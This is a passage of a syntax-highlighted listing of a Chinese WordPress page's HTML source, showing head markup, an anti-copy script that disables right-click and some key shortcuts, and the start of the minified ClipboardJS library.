class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Cache-Control"</span> <span class="attr">content</span>=<span class="string">"no-transform"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Cache-Control"</span> <span class="attr">content</span>=<span class="string">"no-siteapp"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"applicable-device"</span> <span class="attr">content</span>=<span class="string">"pc,mobile"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"MobileOptimized"</span> <span class="attr">content</span>=<span class="string">"width"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"HandheldFriendly"</span> <span class="attr">content</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span> <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0; url=http://www.gebidemengmianren.com/my-plugins/no-js.html"</span> /&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">media</span>=<span class="string">"all"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/cache/autoptimize/css/autoptimize_fbc8fb4f52ab77546156f37a7cb23309.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>当代中国政府与政治2019 &amp;#8211; 隔壁的萌面人<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">id</span>=<span class="string">'dashicons-css'</span> <span class="attr">href</span>=<span class="string">'http://www.gebidemengmianren.com/wp-includes/css/dashicons.min.css?ver=6f0a90e1258fc95d5c87f731d5ec4784'</span> <span class="attr">type</span>=<span class="string">'text/css'</span> <span class="attr">media</span>=<span class="string">'all'</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--[if lt IE 9]&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/html5shiv.min.js?ver=3.7.3'&gt;&lt;/script&gt; &lt;![endif]--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> wellington_menu_title = <span class="string">"\u83dc\u5355"</span>;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-content/themes/wellington/js/navigation.js?ver=20160719'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'prev'</span> <span class="attr">title</span>=<span class="string">'密码保护：当代中国经济2019修正版'</span> <span class="attr">href</span>=<span class="string">'http://www.gebidemengmianren.com/eryadaanfufei/196.html'</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'next'</span> <span class="attr">title</span>=<span class="string">'密码保护：当政府遇上互联网2019'</span> <span class="attr">href</span>=<span class="string">'http://www.gebidemengmianren.com/eryadaanfufei/200.html'</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"canonical"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/eryadaanfufei/198.html"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.ondragstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">    &#125;; <span class="comment">//for image</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.oncontextmenu = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">    &#125;; <span class="comment">//for right click disable</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (e.ctrlKey &amp;&amp;</span></span><br><span class="line"><span class="undefined">        (e.keyCode === 65 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 67 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 73 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 74 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 80 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 83 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 85 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 86 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 117</span></span><br><span class="line"><span class="undefined">        )) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (e.keyCode == <span class="number">18</span> || e.keyCode == <span class="number">123</span>) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g-150x150.jpg"</span> <span class="attr">sizes</span>=<span class="string">"32x32"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg"</span> <span class="attr">sizes</span>=<span class="string">"192x192"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"apple-touch-icon-precomposed"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"msapplication-TileImage"</span> <span class="attr">content</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"post-template-default single single-post postid-198 single-format-standard post-layout-one-column"</span> <span class="attr">id</span>=<span class="string">'body'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    ! <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="string">"object"</span> == <span class="keyword">typeof</span> exports &amp;&amp; <span class="string">"object"</span> == <span class="keyword">typeof</span> <span class="built_in">module</span> ? <span class="built_in">module</span>.exports = e() : <span class="string">"function"</span> == <span class="keyword">typeof</span> define &amp;&amp; define.amd ? define([], e) : <span class="string">"object"</span> == <span class="keyword">typeof</span> exports ? exports.ClipboardJS = e() : t.ClipboardJS = e()</span></span><br><span class="line"><span class="javascript">    &#125;(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params">o</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (n[o]) <span class="keyword">return</span> n[o].exports;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> r = n[o] = &#123;</span></span><br><span class="line"><span class="undefined">            i: o,</span></span><br><span class="line"><span class="undefined">            l: !1,</span></span><br><span class="line"><span class="undefined">            exports: &#123;&#125;</span></span><br><span class="line"><span class="undefined">          &#125;;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> t[o].call(r.exports, r, r.exports, e), r.l = !<span class="number">0</span>, r.exports</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> n = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> e.m = t, e.c = n, e.i = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> t</span></span><br><span class="line"><span class="javascript">        &#125;, e.d = <span class="function"><span class="keyword">function</span>(<span class="params">t, n, o</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          e.o(t, n) || <span class="built_in">Object</span>.defineProperty(t, n, &#123;</span></span><br><span class="line"><span class="undefined">            configurable: !1,</span></span><br><span class="line"><span class="undefined">            enumerable: !0,</span></span><br><span class="line"><span class="javascript">            <span class="keyword">get</span>: o</span></span><br><span class="line"><span class="undefined">          &#125;)</span></span><br><span class="line"><span class="javascript">        &#125;, e.n = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> n = t &amp;&amp; t.__esModule ? <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> t.default</span></span><br><span class="line"><span class="javascript">          &#125; : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> t</span></span><br><span class="line"><span class="undefined">          &#125;;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> e.d(n, <span class="string">"a"</span>, n), n</span></span><br><span class="line"><span class="javascript">        &#125;, e.o = <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.hasOwnProperty.call(t, e)</span></span><br><span class="line"><span class="javascript">        &#125;, e.p = <span class="string">""</span>, e(e.s = <span class="number">3</span>)</span></span><br><span class="line"><span class="javascript">      &#125;([<span class="function"><span class="keyword">function</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> o, r, i;</span></span><br><span class="line"><span class="javascript">        ! <span class="function"><span class="keyword">function</span>(<span class="params">a, c</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          r = [t, n(<span class="number">7</span>)], o = c, <span class="keyword">void</span> <span class="number">0</span> !== (i = <span class="string">"function"</span> == <span class="keyword">typeof</span> o ? o.apply(e, r) : o) &amp;&amp; (t.exports = i)</span></span><br><span class="line"><span class="javascript">        &#125;(<span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="meta">          "use strict"</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (!(t <span class="keyword">instanceof</span> e)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> o = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> t &amp;&amp; t.__esModule ? t : &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">default</span>: t</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="undefined">            &#125;(e),</span></span><br><span class="line"><span class="javascript">            r = <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span> &amp;&amp; <span class="string">"symbol"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span>.iterator ? <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> <span class="keyword">typeof</span> t</span></span><br><span class="line"><span class="javascript">            &#125; : <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> t &amp;&amp; <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span> &amp;&amp; t.constructor === <span class="built_in">Symbol</span> &amp;&amp; t !== <span class="built_in">Symbol</span>.prototype ? <span class="string">"symbol"</span> : <span class="keyword">typeof</span> t</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            i = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; e.length; n++) &#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> o = e[n];</span></span><br><span class="line"><span class="javascript">                  o.enumerable = o.enumerable || !<span class="number">1</span>, o.configurable = !<span class="number">0</span>, <span class="string">"value"</span> <span class="keyword">in</span> o &amp;&amp; (o.writable = !<span class="number">0</span>), <span class="built_in">Object</span>.defineProperty(t, o.key, o)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">e, n, o</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> n &amp;&amp; t(e.prototype, n), o &amp;&amp; t(e, o), e</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="undefined">            &#125;(),</span></span><br><span class="line"><span class="javascript">            a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                n(<span class="keyword">this</span>, t), <span class="keyword">this</span>.resolveOptions(e), <span class="keyword">this</span>.initSelection()</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> i(t, [&#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"resolveOptions"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) 